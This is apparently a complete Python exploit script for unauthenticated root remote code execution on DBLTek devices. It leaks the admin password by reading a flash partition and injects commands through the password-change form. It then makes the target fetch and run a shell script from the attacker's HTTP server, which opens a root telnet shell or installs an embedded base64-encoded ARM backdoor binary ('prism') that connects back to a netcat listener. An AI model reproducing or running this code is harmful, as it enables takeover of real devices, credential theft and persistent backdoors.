#!/usr/bin/python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import os, sys, base64, bz2, socket, argparse, threading, requests, re
PAYLOAD0 = '''#!/bin/sh
rm -f /tmp/y
/bin/busybox telnetd -l /bin/sh -p %d &
'''
PAYLOAD1 = '''#!/bin/sh
rm -f /tmp/y /tmp/p
wget -O /tmp/p http://%s:%d/prism
chmod 755 /tmp/p
/tmp/p
'''
class Handler(BaseHTTPRequestHandler):
    PRISM_PORT = 1337
    TELNET_PORT = 23
    def do_GET(self):
        if self.path == '/0':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            payload = PAYLOAD0 % Handler.TELNET_PORT
            self.wfile.write(payload.encode())
            return
        if self.path == '/1':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            payload = PAYLOAD1 % (Handler.HTTP_ADDR, Handler.HTTP_PORT)
            self.wfile.write(payload.encode())
            return
        if self.path == '/prism':
            self.send_response(200)
            self.send_header('Content-type', 'octet/stream')
            self.end_headers()
            self.wfile.write(prism(Handler.HTTP_ADDR, Handler.PRISM_PORT))
            return
        self.send_response(404)
    def log_message(self, format, *args):
        print(' -- SERVING ' + format % args)
class Server(threading.Thread):
    def __init__(self, addr='0.0.0.0', port=8080):
        threading.Thread.__init__(self)
        Handler.HTTP_ADDR = addr
        Handler.HTTP_PORT = port
        self.httpd = HTTPServer((addr, port), Handler)
    def set(mime, data):
        self.RequestHandlerClass.mime = mime
        self.RequestHandlerClass.data = data
    def run(self):
        print(' - Starting server http://%s:%s' % self.httpd.socket.getsockname())
        self.httpd.serve_forever()
    def stop(self):
        print(' - Stopping server')
        self.httpd.shutdown()
def prism(host, port):
    pyfile = open(os.path.realpath(__file__), 'r')
    data, skip = '', True
    for line in pyfile:
        if skip and line != '""" PRISM ARM V5L\n':
            continue
        if line == '"""\n':
            break
        if not skip:
            data += line.strip()
        skip = False
    port = str(port)
    bhost = host.encode() + (b'\0' * (16 - len(host)))
    bport = port.encode() + (b'\0' * ( 6 - len(port)))
    binary = bytearray(bz2.decompress(base64.b64decode(data)))
    binary[0x7810:0x7810+16] = bhost
    binary[0x7820:0x7820+ 6] = bport
    return binary
def getip(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((host, 1337))
    return s.getsockname()[0]
def get(url):
    print(' -- GET %s' % url)
    response = requests.get(url)
    return response.text
def post(url, password, data):
    print(' -- POST %s' % url)
    header = { 'Content-Type': 'application/x-www-form-urlencoded' }
    auth = requests.auth.HTTPBasicAuth('admin', password)
    response = requests.post(url, auth=auth, data=data, headers=header)
    return response.text
def attack_leak(target, variable):
    print(' - Dumping configuration (variable=%s)' % variable)
    config = get('http://%s/default/en_US/frame.html?content=/dev/mtdblock/5' % target)
    m = re.search(r'%s="(.*)"' % variable, config)
    if not m:
        print('Cannot leak variable %s :(' % variable)
        sys.exit(1)
    return m.group(1)
def attack_exec(target, password, command):
    print(' - Executing "%s"' % command)
    argv = ', '.join(command.split())
    data = 'level=user&user_level_enable=on&passwd=<%%25call system.exec: %s>' % argv
    post('http://%s/default/en_US/change_password.csp' % target, password, data)
    get('http://%s/default/en_US/frame.html?content=/dev/mtdblock/5' % target)
# Parsing attacker input
parser = argparse.ArgumentParser(description='DBLTek Unauthenticated Pre-Auth RCE as root', epilog="""
Available modes are:
 1 - Use telnetd on port %d
 2 - Use prism daemon with port %d
""" % (Handler.TELNET_PORT, Handler.PRISM_PORT), formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-a', '--addr', dest='addr', type=str, default=None, help="http server address")
parser.add_argument('-p', '--port', dest='port', type=int, default=8080, help="http server port (default: 8080)")
parser.add_argument('-m', '--mode', dest='mode', type=int, default=0, help="attack mode (default 0)")
parser.add_argument('target')
args = parser.parse_args(sys.argv[1:])
# Get local address based on target address and routes
myaddr = getip(args.target)
myport = args.port
# Start payload delivery server
server = Server(args.addr or myaddr, myport)
server.start()
try:
    # Leak ADMIN_PASSWORD
    password = attack_leak(args.target, 'ADMIN_PASSWORD')
    print(" -- ADMIN_PASSWORD = '%s'" % password)
    attack_exec(args.target, password, "/bin/wget -O /tmp/y http://%s:%d/%d" % (myaddr, myport, args.mode))
    attack_exec(args.target, password, "/bin/sh /tmp/y")
    print(""" - Use these commands to wipe:
 -- => setsyscfg USER_PASSWORD=
 -- => setsyscfg USER_LEVEL_ENABLE=0""")
    if args.mode == 0:
        print(" - Telnet to %s port %d" % (args.target, Handler.TELNET_PORT))
        os.system("telnet %s %d" % (args.target, Handler.TELNET_PORT))
    if args.mode == 1:
        print(" - Listen on %s:%d (wait 15 seconds at least)" % (myaddr, Handler.PRISM_PORT))
        os.system("nc -l -p %d" % Handler.PRISM_PORT)
except RuntimeError as e:
    print(" - Failed :(")
    pass
# Stop payload delivery server
server.stop()
server.join()
""" PRISM ARM V5L
QlpoOTFBWSZTWao5rFYALq1/////////////////////////////////////////////4EoPlbVQ
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
